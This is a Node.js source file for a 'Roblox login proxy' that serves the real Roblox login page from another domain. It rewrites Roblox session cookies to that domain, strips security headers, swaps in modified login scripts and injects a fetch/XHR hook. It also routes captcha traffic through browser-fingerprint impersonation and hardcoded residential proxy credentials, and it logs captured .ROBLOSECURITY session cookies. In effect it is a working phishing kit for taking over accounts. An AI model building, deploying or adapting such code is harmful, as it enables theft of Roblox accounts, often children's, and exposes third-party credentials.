const express = require('express');
const { createProxyMiddleware, responseInterceptor } = require('http-proxy-middleware');
const https = require('https');
const http = require('http');
const { HttpsProxyAgent } = require('https-proxy-agent');
const { spawn, execFile } = require('child_process');
const crypto = require('crypto');
const path = require('path');

const app = express();

console.log('='.repeat(60));
console.log('🔒 ROBLOX LOGIN PROXY');
console.log('='.repeat(60));

// ─────────────────────────────────────────────────────────────
// CURL-IMPERSONATE (for Arkose Labs TLS fingerprint)
// ─────────────────────────────────────────────────────────────
let CURL_BIN = 'curl';
function detectCurlBin() {
    const candidates = ['curl_chrome124', 'curl_chrome120', 'curl-impersonate-chrome', 'curl'];
    let idx = 0;
    function tryNext() {
        if (idx >= candidates.length) return;
        const bin = candidates[idx++];
        execFile(bin, ['--version'], { timeout: 3000 }, (err) => {
            if (!err) {
                CURL_BIN = bin;
                if (bin === 'curl') {
                    console.warn('⚠️  curl-impersonate NOT found — using plain curl.');
                } else {
                    console.log(`✅ curl-impersonate: ${bin}`);
                }
            } else { tryNext(); }
        });
    }
    tryNext();
}
detectCurlBin();

// ─────────────────────────────────────────────────────────────
// RESIDENTIAL PROXIES (for Arkose Labs)
// ─────────────────────────────────────────────────────────────
const RESIDENTIAL_PROXIES = [
    'http://104574_FmGRR_s_1KB03APR4ILFSCMW:HoxFFU3jQA@residential.pingproxies.com:8872',
    'http://104574_FmGRR_s_BAY283TIWZ05HV2A:HoxFFU3jQA@residential.pingproxies.com:8392',
    'http://104574_FmGRR_s_Y3QTLQRA0S49RUWK:HoxFFU3jQA@residential.pingproxies.com:8269',
    'http://104574_FmGRR_s_L8K0M14X3H8KAIOL:HoxFFU3jQA@residential.pingproxies.com:8221',
    'http://104574_FmGRR_s_Q4FLL3QJZ46JQ2YF:HoxFFU3jQA@residential.pingproxies.com:8977',
];
let proxyIndex = 0;
function getNextProxy() {
    const p = RESIDENTIAL_PROXIES[proxyIndex];
    proxyIndex = (proxyIndex + 1) % RESIDENTIAL_PROXIES.length;
    return p;
}

// ─────────────────────────────────────────────────────────────
// SHARED AGENTS
// ─────────────────────────────────────────────────────────────
const httpsAgent = new https.Agent({ keepAlive: true, maxSockets: 50, timeout: 30000 });

const BROWSER_UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36';

const CHALLENGE_HEADERS = [
    'rblx-challenge-id',
    'rblx-challenge-type',
    'rblx-challenge-metadata',
    'x-retry-attempt',
];

// ─────────────────────────────────────────────────────────────
// SERVE MODIFIED JS FILES
// Place EnvironmentUrls.js, CoreUtilities.js, Challenge.js,
// ReactLogin.js inside /modified-js folder next to index.js
// ─────────────────────────────────────────────────────────────
app.use('/js', express.static(path.join(__dirname, 'modified-js')));

// ─────────────────────────────────────────────────────────────
// HELPERS
// ─────────────────────────────────────────────────────────────
function generateProxyMetaTags() {
    const sid    = crypto.randomBytes(16).toString('hex');
    const secure = crypto.createHash('md5').update(sid).digest('hex');
    return `<meta name="proxy" value="${sid}">` +
           `<meta name="token" value="${sid}">` +
           `<meta name="secure" value="${secure}">` +
           `<meta name="meta" value="">`;
}

function rewriteCookies(cookies, host) {
    if (!cookies) return cookies;
    const cleanHost = host.replace(/^www\./, '');
    return cookies.map(c =>
        c.replace(/Domain=\.?roblox\.com/gi, `Domain=.${cleanHost}`)
         .replace(/Domain=\.?rbxcdn\.com/gi, `Domain=.${cleanHost}`)
         .replace(/\bSecure\b/gi, 'Secure; SameSite=None')
    );
}

function getDeviceId(req) {
    const m = (req.headers.cookie || '').match(/rbx-device-id=([^;]+)/);
    return m ? m[1] : crypto.randomBytes(32).toString('hex');
}

function setCors(res, origin) {
    res.set('Access-Control-Allow-Origin', origin);
    res.set('Access-Control-Allow-Credentials', 'true');
    res.set('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS, PATCH');
    res.set('Access-Control-Allow-Headers', [
        'Content-Type', 'x-csrf-token', 'Authorization',
        'rbx-device-id', 'rbxdeviceid', 'x-bound-auth-token',
        'Accept', 'Accept-Language', 'Accept-Encoding',
        ...CHALLENGE_HEADERS
    ].join(', '));
    res.set('Access-Control-Expose-Headers', ['x-csrf-token', ...CHALLENGE_HEADERS].join(', '));
}

// ─────────────────────────────────────────────────────────────
// LOGGING
// ─────────────────────────────────────────────────────────────
app.use((req, res, next) => {
    const start = Date.now();
    res.on('finish', () => {
        const skip = ['/www/e.png', '/pe'];
        if (!skip.some(s => req.path.includes(s))) {
            console.log(`[${new Date().toISOString()}] ${req.method} ${req.path} → ${res.statusCode} (${Date.now() - start}ms)`);
        }
    });
    next();
});

// ─────────────────────────────────────────────────────────────
// CORS PREFLIGHT
// ─────────────────────────────────────────────────────────────
app.options('*', (req, res) => {
    setCors(res, req.headers['origin'] || `https://${req.headers.host}`);
    res.sendStatus(200);
});

// ─────────────────────────────────────────────────────────────
// LOGIN HANDLER  (/v2/login and /v3/login)
// Handles CSRF dance + challenge headers manually
// ─────────────────────────────────────────────────────────────
function doLoginRequest(bodyStr, cookieHeader, csrfToken, ua, extraHeaders) {
    return new Promise((resolve, reject) => {
        const bodyBuf = Buffer.from(bodyStr, 'utf8');
        const headers = {
            'Content-Type':    'application/json;charset=UTF-8',
            'Content-Length':  bodyBuf.length,
            'Accept':          'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Origin':          'https://www.roblox.com',
            'Referer':         'https://www.roblox.com/login',
            'User-Agent':      ua || BROWSER_UA,
            'Connection':      'keep-alive',
        };
        const forward = ['rbx-device-id', 'rbxdeviceid', 'x-bound-auth-token', ...CHALLENGE_HEADERS];
        for (const h of forward) {
            if (extraHeaders[h]) headers[h] = extraHeaders[h];
        }
        if (cookieHeader) headers['Cookie']       = cookieHeader;
        if (csrfToken)    headers['X-CSRF-TOKEN'] = csrfToken;

        const req = https.request({
            hostname: 'auth.roblox.com',
            path:     '/v2/login',
            method:   'POST',
            headers,
            agent:    httpsAgent,
        }, (res) => {
            let data = '';
            res.on('data', c => data += c);
            res.on('end', () => resolve({ status: res.statusCode, headers: res.headers, body: data }));
        });
        req.on('error', reject);
        req.write(bodyBuf);
        req.end();
    });
}

async function doLoginWithRetry(bodyStr, cookie, csrf, ua, extra, maxRetries = 2) {
    let lastErr;
    for (let i = 0; i <= maxRetries; i++) {
        try { return await doLoginRequest(bodyStr, cookie, csrf, ua, extra); }
        catch (e) {
            lastErr = e;
            if (['ECONNRESET','ETIMEDOUT','ECONNREFUSED'].includes(e.code)) {
                await new Promise(r => setTimeout(r, 500 * (i + 1)));
            } else throw e;
        }
    }
    throw lastErr;
}

function forwardLoginResponse(res, result, host, origin, deviceId) {
    const cleanHost = host.replace(/^www\./, '');
    setCors(res, origin);

    for (const h of ['x-csrf-token', 'content-type', 'cache-control', ...CHALLENGE_HEADERS]) {
        if (result.headers[h]) res.set(h, result.headers[h]);
    }

    let cookies = rewriteCookies(result.headers['set-cookie'], host) || [];
    if (deviceId) cookies.push(`rbx-device-id=${deviceId}; Domain=.${cleanHost}; Path=/; Secure; SameSite=None`);
    if (cookies.length) res.set('Set-Cookie', cookies);

    const hasRoblo = (result.headers['set-cookie'] || []).some(c => c.includes('.ROBLOSECURITY'));
    if (hasRoblo) console.log('✅ .ROBLOSECURITY received — login success!');
    else if (result.status === 200) console.log('⚠️  200 but no .ROBLOSECURITY');

    res.status(result.status).send(result.body);
}

async function loginHandler(req, res) {
    if (req.method !== 'POST') return res.status(405).send('Method not allowed');

    const host     = req.headers.host || 'localhost';
    const origin   = req.headers['origin'] || `https://${host}`;
    const ua       = req.headers['user-agent'] || BROWSER_UA;
    const cookies  = req.headers['cookie'] || '';
    const deviceId = getDeviceId(req);

    const hasChallenge = !!(req.headers['rblx-challenge-metadata'] && req.headers['rblx-challenge-id']);
    console.log(`🔑 LOGIN | Challenge: ${hasChallenge ? 'YES' : 'NO'}`);

    try {
        const bodyStr = req.body.toString('utf8');

        // If browser already has challenge solution, send it directly
        if (hasChallenge) {
            let result = await doLoginWithRetry(bodyStr, cookies, null, ua, req.headers);
            if (result.status === 403 && result.headers['x-csrf-token']) {
                let cookieHeader = cookies;
                if (result.headers['set-cookie']) {
                    const extra = result.headers['set-cookie'].map(c => c.split(';')[0]).join('; ');
                    cookieHeader = cookieHeader ? `${cookieHeader}; ${extra}` : extra;
                }
                result = await doLoginWithRetry(bodyStr, cookieHeader, result.headers['x-csrf-token'], ua, req.headers);
            }
            return forwardLoginResponse(res, result, host, origin, deviceId);
        }

        // Step 1: get CSRF token
        const step1 = await doLoginWithRetry(bodyStr, cookies, null, ua, req.headers);
        console.log(`   Step 1: ${step1.status}`);
        if (!step1.headers['x-csrf-token']) return forwardLoginResponse(res, step1, host, origin, deviceId);

        // Step 2: retry with CSRF
        let cookieHeader = cookies;
        if (step1.headers['set-cookie']) {
            const extra = step1.headers['set-cookie'].map(c => c.split(';')[0]).join('; ');
            cookieHeader = cookieHeader ? `${cookieHeader}; ${extra}` : extra;
        }
        const step2 = await doLoginWithRetry(bodyStr, cookieHeader, step1.headers['x-csrf-token'], ua, req.headers);
        console.log(`   Step 2: ${step2.status}`);

        // Step 3: if token rotated, retry once more
        let final = step2;
        if (step2.status === 403 && step2.headers['x-csrf-token'] && step2.headers['x-csrf-token'] !== step1.headers['x-csrf-token']) {
            if (step2.headers['set-cookie']) {
                const extra = step2.headers['set-cookie'].map(c => c.split(';')[0]).join('; ');
                cookieHeader = cookieHeader ? `${cookieHeader}; ${extra}` : extra;
            }
            final = await doLoginWithRetry(bodyStr, cookieHeader, step2.headers['x-csrf-token'], ua, req.headers);
            console.log(`   Step 3: ${final.status}`);
        }

        if (final.status === 200) console.log('✅ LOGIN SUCCESS');
        else if (final.headers['rblx-challenge-id']) console.log('🧩 Challenge required');
        else console.log(`❌ Login failed: ${final.status}`);

        forwardLoginResponse(res, final, host, origin, deviceId);

    } catch (err) {
        console.error('[login] Error:', err.message);
        res.status(502).json({ error: 'Proxy error', message: err.message });
    }
}

app.use('/v2/login', express.raw({ type: '*/*' }), loginHandler);
app.use('/v3/login', express.raw({ type: '*/*' }), loginHandler);

// ─────────────────────────────────────────────────────────────
// ARKOSE LABS — curl-impersonate proxy
// ─────────────────────────────────────────────────────────────
function makeArkoseRequest(method, url, outHeaders, proxyUrl, body) {
    return new Promise((resolve, reject) => {
        const args = ['--silent', '--include', '--max-time', '30', '--http2', '--compressed', '-X', method.toUpperCase()];
        if (proxyUrl) args.push('-x', proxyUrl);

        const skip = new Set(['host', 'content-length', 'transfer-encoding', 'connection', 'accept-encoding']);
        for (const [k, v] of Object.entries(outHeaders)) {
            if (!skip.has(k.toLowerCase())) args.push('-H', `${k}: ${v}`);
        }
        if (body && body.length > 0) args.push('--data-binary', '@-');
        args.push(url);

        const child = spawn(CURL_BIN, args, { timeout: 35000 });
        if (body && body.length > 0) { child.stdin.write(body); }
        child.stdin.end();

        const chunks = [];
        let stderr = '';
        child.stdout.on('data', c => chunks.push(c));
        child.stderr.on('data', c => { stderr += c.toString(); });
        child.on('error', reject);
        child.on('close', () => {
            const buf = Buffer.concat(chunks);
            const raw = buf.toString('binary');
            const httpRe = /HTTP\/[\d.]+ \d+[^\r\n]*/g;
            let lastMatch = null, m;
            while ((m = httpRe.exec(raw)) !== null) lastMatch = m;
            if (!lastMatch) return reject(new Error(`curl exit — no HTTP response. stderr: ${stderr}`));

            const hdrStart = lastMatch.index;
            const hdrEnd   = raw.indexOf('\r\n\r\n', hdrStart);
            if (hdrEnd === -1) return reject(new Error('No end of headers'));

            const statusCode = parseInt(lastMatch[0].match(/\d{3}/)[0], 10);
            const parsedHdrs = {};
            for (const line of raw.substring(hdrStart, hdrEnd).split('\r\n').slice(1)) {
                const ci = line.indexOf(':');
                if (ci < 1) continue;
                const k = line.substring(0, ci).trim().toLowerCase();
                const v = line.substring(ci + 1).trim();
                parsedHdrs[k] = parsedHdrs[k] !== undefined ? [].concat(parsedHdrs[k], v) : v;
            }
            resolve({ statusCode, headers: parsedHdrs, body: buf.slice(hdrEnd + 4) });
        });
    });
}

function createArkoseProxy(target) {
    const arkoseOrigin = target.replace(/\/+$/, '');
    return async (req, res) => {
        const origin = req.headers['origin'] || `https://${req.headers.host}`;
        setCors(res, origin);

        const qs        = req.url.includes('?') ? req.url.slice(req.url.indexOf('?')) : '';
        const targetUrl = `${arkoseOrigin}${req.path}${qs}`;
        const outHeaders = {
            'Origin':          arkoseOrigin,
            'Referer':         `${arkoseOrigin}/`,
            'User-Agent':      req.headers['user-agent'] || BROWSER_UA,
            'Accept':          req.headers['accept'] || '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
        };
        if (req.headers['content-type']) outHeaders['Content-Type'] = req.headers['content-type'];
        for (const h of CHALLENGE_HEADERS) { if (req.headers[h]) outHeaders[h] = req.headers[h]; }

        let body = null;
        if (['POST','PUT','PATCH'].includes(req.method.toUpperCase())) {
            body = await new Promise(resolve => {
                const bufs = [];
                req.on('data', c => bufs.push(c));
                req.on('end', () => resolve(Buffer.concat(bufs)));
            });
        }

        try {
            const result = await makeArkoseRequest(req.method, targetUrl, outHeaders, getNextProxy(), body);
            const skipHdrs = new Set([
                'content-security-policy', 'content-security-policy-report-only',
                'x-content-security-policy', 'transfer-encoding', 'connection', 'content-encoding'
            ]);
            for (const [k, v] of Object.entries(result.headers)) {
                if (skipHdrs.has(k)) continue;
                if (k === 'set-cookie') res.set('Set-Cookie', rewriteCookies([].concat(v), req.headers.host || 'localhost'));
                else try { res.set(k, v); } catch (_) {}
            }
            res.status(result.statusCode).send(result.body);
        } catch (err) {
            console.error(`[arkose] ❌ ${err.message}`);
            if (!res.headersSent) res.status(502).json({ error: 'Arkose proxy error', message: err.message });
        }
    };
}

// ─────────────────────────────────────────────────────────────
// STANDARD API PROXY FACTORY
// ─────────────────────────────────────────────────────────────
function createApiProxy(target, pathPrefix) {
    return createProxyMiddleware({
        target: `https://${target}`,
        changeOrigin: true,
        secure: true,
        proxyTimeout: 30000,
        timeout: 30000,
        agent: httpsAgent,
        pathRewrite: pathPrefix ? (path) => pathPrefix + path : undefined,
        on: {
            proxyReq: (proxyReq, req) => {
                try {
                    proxyReq.setHeader('origin',          'https://www.roblox.com');
                    proxyReq.setHeader('referer',         'https://www.roblox.com/login');
                    proxyReq.setHeader('user-agent',      req.headers['user-agent'] || BROWSER_UA);
                    proxyReq.setHeader('accept-language', 'en-US,en;q=0.9');
                    proxyReq.setHeader('accept-encoding', 'gzip, deflate, br');
                    if (req.headers['x-csrf-token'])       proxyReq.setHeader('x-csrf-token',       req.headers['x-csrf-token']);
                    if (req.headers['rbx-device-id'])      proxyReq.setHeader('rbx-device-id',      req.headers['rbx-device-id']);
                    if (req.headers['x-bound-auth-token']) proxyReq.setHeader('x-bound-auth-token', req.headers['x-bound-auth-token']);
                    for (const h of CHALLENGE_HEADERS) { if (req.headers[h]) proxyReq.setHeader(h, req.headers[h]); }
                } catch (e) { if (e.code !== 'ERR_HTTP_HEADERS_SENT') throw e; }
            },
            proxyRes: (proxyRes, req) => {
                delete proxyRes.headers['content-security-policy'];
                delete proxyRes.headers['content-security-policy-report-only'];
                delete proxyRes.headers['x-content-security-policy'];
                const origin = req.headers['origin'] || `https://${req.headers.host}`;
                proxyRes.headers['access-control-allow-origin']      = origin;
                proxyRes.headers['access-control-allow-credentials'] = 'true';
                proxyRes.headers['access-control-expose-headers']    = ['x-csrf-token', ...CHALLENGE_HEADERS].join(', ');
                if (proxyRes.headers['set-cookie']) {
                    proxyRes.headers['set-cookie'] = rewriteCookies(proxyRes.headers['set-cookie'], req.headers.host || 'localhost');
                }
            },
            error: (err, req, res) => {
                console.error(`[api:${target}] ❌ ${req.method} ${req.path} | ${err.code}: ${err.message}`);
                if (!res.headersSent) res.status(502).json({ error: 'Proxy error', code: err.code });
            }
        }
    });
}

// ─────────────────────────────────────────────────────────────
// ROUTE MAP
// Order matters — more specific paths must come first
// ─────────────────────────────────────────────────────────────

// Arkose Labs — curl-impersonate with residential proxy
const ARKOSE_ROUTES = [
    ['/arkose-api',     'https://roblox-api.arkoselabs.com'],
    ['/arkose-client',  'https://client-api.arkoselabs.com'],
    ['/arkose-cdn',     'https://cdn.arkoselabs.com'],
    ['/arkose-fc',      'https://fc.arkoselabs.com'],
    ['/arkose-game',    'https://game.arkoselabs.com'],
    ['/arkose-assets',  'https://assets.arkoselabs.com'],
    ['/arkose-images',  'https://roblox-images.arkoselabs.com'],
    ['/captcha-rbxcdn', 'https://captcha.rbxcdn.com'],
    ['/apis-rbxcdn',    'https://apis.rbxcdn.com'],
];

// Standard Roblox API routes
// These match what location.origin resolves to in their EnvironmentUrls.js
// Format: [routePrefix, target, pathPrefixToRestore?]
// Services with NXDOMAIN subdomains are routed via apis.roblox.com gateway
const API_ROUTES = [
    // Challenge system (critical for login)
    ['/challenge',                        'apis.roblox.com'],
    ['/account-security-service',         'apis.roblox.com',                        '/account-security-service'],
    ['/proof-of-work-service',            'apis.roblox.com',                        '/proof-of-work-service'],
    ['/auth-token-service',               'apis.roblox.com',                        '/auth-token-service'],
    ['/hba-service',                      'apis.roblox.com',                        '/hba-service'],
    ['/rotating-client-service',          'apis.roblox.com',                        '/rotating-client-service'],

    // Experimentation & config
    ['/product-experimentation-platform', 'apis.roblox.com',                        '/product-experimentation-platform'],
    ['/universal-app-configuration',      'apis.roblox.com'],
    ['/guac-v2',                          'apis.roblox.com',                        '/guac-v2'],

    // OTP & captcha
    ['/otp-service',                      'apis.roblox.com',                        '/otp-service'],
    ['/captcha',                          'apis.roblox.com'],

    // Core APIs via location.origin
    ['/v1/account-information',           'accountinformation.roblox.com'],
    ['/v2/account-information',           'accountinformation.roblox.com'],
    ['/v1/users',                         'users.roblox.com'],
    ['/v2/users',                         'users.roblox.com'],
    ['/v1/avatar',                        'avatar.roblox.com'],
    ['/v2/avatar',                        'avatar.roblox.com'],
    ['/v1/badges',                        'badges.roblox.com'],
    ['/v1/catalog',                       'catalog.roblox.com'],
    ['/v2/catalog',                       'catalog.roblox.com'],
    ['/v1/economy',                       'economy.roblox.com'],
    ['/v2/economy',                       'economy.roblox.com'],
    ['/v1/friends',                       'friends.roblox.com'],
    ['/v2/friends',                       'friends.roblox.com'],
    ['/v1/presence',                      'presence.roblox.com'],
    ['/v2/presence',                      'presence.roblox.com'],
    ['/v1/thumbnails',                    'thumbnails.roblox.com'],
    ['/v2/thumbnails',                    'thumbnails.roblox.com'],
    ['/v1/groups',                        'groups.roblox.com'],
    ['/v2/groups',                        'groups.roblox.com'],
    ['/v1/metrics',                       'metrics.roblox.com'],
    ['/v1/games',                         'games.roblox.com'],
    ['/v2/games',                         'games.roblox.com'],

    // Reporting (non-critical)
    ['/game/report-event',                'www.roblox.com'],
    ['/ecsv2-api',                        'ecsv2.roblox.com'],
    ['/client-telemetry',                 'client-telemetry.roblox.com'],
    ['/ephemeralcounters',                'ephemeralcounters.roblox.com'],
];

// Register Arkose routes
for (const [prefix, target] of ARKOSE_ROUTES) {
    app.use(prefix, createArkoseProxy(target));
}

// Register API routes
for (const [prefix, target, pathPrefix] of API_ROUTES) {
    app.use(prefix, createApiProxy(target, pathPrefix));
}

// ─────────────────────────────────────────────────────────────
// INJECTED SCRIPT
// Keeps credentials on all requests, tracks challenge state
// ─────────────────────────────────────────────────────────────
const INJECTED_SCRIPT = `<script>
(function() {
    var _fetch = window.fetch;
    window.fetch = function(resource, init) {
        init = init || {};
        init.credentials = 'include';
        return _fetch.call(this, resource, init).then(function(response) {
            var challengeId       = response.headers.get('rblx-challenge-id');
            var challengeType     = response.headers.get('rblx-challenge-type');
            var challengeMetadata = response.headers.get('rblx-challenge-metadata');
            if (challengeId) {
                window.__rblxChallengeId   = challengeId;
                window.__rblxChallengeType = challengeType;
                if (challengeMetadata) {
                    try {
                        var meta = JSON.parse(atob(challengeMetadata));
                        window.__rblxUserId           = meta.userId;
                        window.__rblxBrowserTrackerId = meta.browserTrackerId;
                    } catch(e) {}
                }
            }
            return response;
        });
    };
    var _open = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(method, url) {
        this.__url = url;
        return _open.apply(this, arguments);
    };
    var _send = XMLHttpRequest.prototype.send;
    XMLHttpRequest.prototype.send = function() {
        this.withCredentials = true;
        return _send.apply(this, arguments);
    };
    console.log('[Proxy] Interceptor loaded');
})();
</script>`;

// ─────────────────────────────────────────────────────────────
// MAIN PAGE HANDLER
// Serves Roblox login page with injected meta tags + script
// CSS/JS CDN loaded directly by browser — not proxied
// ─────────────────────────────────────────────────────────────
app.use('/', createProxyMiddleware({
    target: 'https://www.roblox.com',
    changeOrigin: true,
    secure: true,
    selfHandleResponse: true,
    proxyTimeout: 30000,
    timeout: 30000,
    agent: httpsAgent,

    pathRewrite: (reqPath) => (reqPath === '/' ? '/login' : reqPath),

    on: {
        proxyReq: (proxyReq, req) => {
            proxyReq.setHeader('user-agent',      req.headers['user-agent'] || BROWSER_UA);
            proxyReq.setHeader('accept',          'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8');
            proxyReq.setHeader('accept-language', 'en-US,en;q=0.9');
            proxyReq.setHeader('accept-encoding', 'gzip, deflate, br');
        },

        proxyRes: responseInterceptor(async (buffer, proxyRes, req, res) => {
            const host   = req.headers.host || 'localhost';
            const origin = req.headers['origin'] || `https://${host}`;

            // Strip CSP so browser doesn't block anything
            delete proxyRes.headers['content-security-policy'];
            delete proxyRes.headers['content-security-policy-report-only'];
            delete proxyRes.headers['x-content-security-policy'];

            // Rewrite cookies to our domain
            if (proxyRes.headers['set-cookie']) {
                proxyRes.headers['set-cookie'] = rewriteCookies(proxyRes.headers['set-cookie'], host);
                console.log(`[main] 🍪 Rewrote ${proxyRes.headers['set-cookie'].length} cookies → .${host.replace(/^www\./, '')}`);
            }

            res.setHeader('access-control-allow-origin',      origin);
            res.setHeader('access-control-allow-credentials', 'true');

            const ct = proxyRes.headers['content-type'] || '';
            if (!ct.includes('text/html')) return buffer;

            let body = buffer.toString('utf8');

            // Replace the 4 Roblox JS files with our modified local versions
            body = body.replace(
                /https?:\/\/[^"']*\/[a-f0-9]+-EnvironmentUrls\.js[^"']*/g,
                `/js/EnvironmentUrls.js`
            );
            body = body.replace(
                /https?:\/\/[^"']*\/[a-f0-9]+-CoreUtilities\.js[^"']*/g,
                `/js/CoreUtilities.js`
            );
            body = body.replace(
                /https?:\/\/[^"']*\/[a-f0-9]+-Challenge\.js[^"']*/g,
                `/js/Challenge.js`
            );
            body = body.replace(
                /https?:\/\/[^"']*\/[a-f0-9]+-ReactLogin\.js[^"']*/g,
                `/js/ReactLogin.js`
            );
            // Handle ?v=N versioned references too
            body = body.replace(/\/js\/ReactLogin\.js\?v=\d+/g, '/js/ReactLogin.js');

            // Inject meta tags + interceptor script
            const metaTags = generateProxyMetaTags();
            body = body.replace('<head', `<head>${metaTags}${INJECTED_SCRIPT}`);

            return body;
        }),

        error: (err, req, res) => {
            console.error(`[main] ❌ ${req.method} ${req.path} | ${err.code}: ${err.message}`);
            if (!res.headersSent) res.status(502).send('Proxy error');
        }
    }
}));

// ─────────────────────────────────────────────────────────────
// START
// ─────────────────────────────────────────────────────────────
const PORT = process.env.PORT || 8080;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Proxy running on port ${PORT}`);
    console.log(`📁 Modified JS from: ${path.join(__dirname, 'modified-js')}`);
    console.log(`📋 ${API_ROUTES.length} API routes | ${ARKOSE_ROUTES.length} Arkose routes`);
});
